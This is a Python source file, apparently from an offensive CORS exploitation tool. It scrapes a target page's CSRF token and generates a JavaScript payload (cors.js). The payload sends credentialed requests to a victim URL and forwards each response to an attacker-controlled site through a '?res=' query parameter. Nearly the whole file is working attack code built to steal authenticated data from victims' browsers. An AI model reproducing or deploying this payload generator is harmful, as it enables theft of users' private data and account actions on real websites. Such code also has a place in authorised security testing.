import re,requests

class writejs():
    def __init__(self, args, arg):
            self.cf = arg
            self.args = args
            self.callcsrf = ''
            if self.args.auth.lower() != 'y':
                self.cookie = '.withCredentials = true;'
            else:
                self.cookie = '.withCredentials = false;'
            if self.args.csrf.lower() == 'y':
                def csrf(dom):
                    req = requests.get(dom)
                    try:
                        token = re.search("name=.*(srf).*",req.text)[0]
                    except:
                        print("No Access To The CSRF Token")
                        exit()
                    token2 = re.search('\s(\w+)',token)[1]
                    token1 = re.search('name="(.*)"\s',token,re.DOTALL)[1].strip()
                    return token1,token2
                self.content1,self.content2 = csrf(self.cf.domain)  
                self.callcsrf= f"token('{self.cf.domain}' , '{self.content1}', '{self.content2}')"
            with open ('CORS_Javascript/cors.js','w') as f:
                f.write('''
        function token(site,reg1 ,reg2){
            var xhr_csrf = new XMLHttpRequest();
            xhr_csrf.onreadystatechange = function() { 
                if(xhr_csrf.readyState === XMLHttpRequest.DONE) {
                    var dom = xhr_csrf.responseText;
                    var parser = new DOMParser().parseFromString(dom,"text/html");
                    csrf = parser.getElementsByName(reg1)[0].getAttribute(reg2);
            }
        }
            xhr_csrf.open('GET', site , false);'''f'''
            xhr_csrf{self.cookie}''''''
            xhr_csrf.send();
        }
            function sendback(site,response){
                var xhr_back = new XMLHttpRequest();
                xhr_back.open('GET', site+'/?res='+response , true);
                xhr_back.send();
            } 
            function sendreq(method, site, victim, args, head){
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                    sendback(site,xhr.responseText);
                    }
                }
                xhr.open(method, victim, true);
                xhr.setRequestHeader('Content-Type', head)
            '''f''' xhr{self.cookie}
            {self.cf.wcsrf}''''''
                xhr.send(args);
            }'''f'''
            if ('{self.cf.method.upper()}' !== 'GET')'''"{"f'''
                {self.callcsrf}
                sendreq('{self.cf.method.upper()}', '{self.args.site}','{self.cf.url}',`{self.cf.body}` ,'{self.cf.content}')
            ''''''}
            else{'''f'''
                sendreq('{self.cf.method.upper()}', '{self.args.site}','{self.cf.url}','','{self.cf.content}')
            ''''}')
            